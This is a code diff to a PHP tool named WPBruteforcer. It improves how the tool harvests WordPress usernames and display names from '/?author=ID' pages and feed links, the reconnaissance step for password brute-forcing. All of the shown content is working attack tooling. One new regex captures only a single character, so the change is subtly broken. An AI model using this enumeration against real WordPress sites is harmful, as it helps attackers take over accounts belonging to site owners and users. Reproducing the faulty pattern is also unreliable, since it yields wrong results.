@@ -278,13 +278,19 @@ class WPBruteforcer
     {
         if ($response = $this->request('/?author=' . $user_id)) {
             $user = ['id' => $user_id, 'login' => null, 'name' => null];
-            // Login
-            preg_match('/archive author author-(.*) author-/', $response, $matches);
+            // Login (author)
+            preg_match('/author author-(.+?)/', $response, $matches);
             if (isset($matches[1])) {
                 $user['login'] = $matches[1];
+            // Login (feed)
+            } else {
+                preg_match('/\/author\/(.+?)\/feed\//', $response, $matches);
+                if (isset($matches[1])) {
+                    $user['login'] = $matches[1];
+                }
             }
             // Name
-            preg_match('/<title>(.*)[,-]/', $response, $matches);
+            preg_match('/<title>(.*)[,\-|]/', $response, $matches);
             if (isset($matches[1])) {
                 $user['name'] = trim($matches[1]);
             }
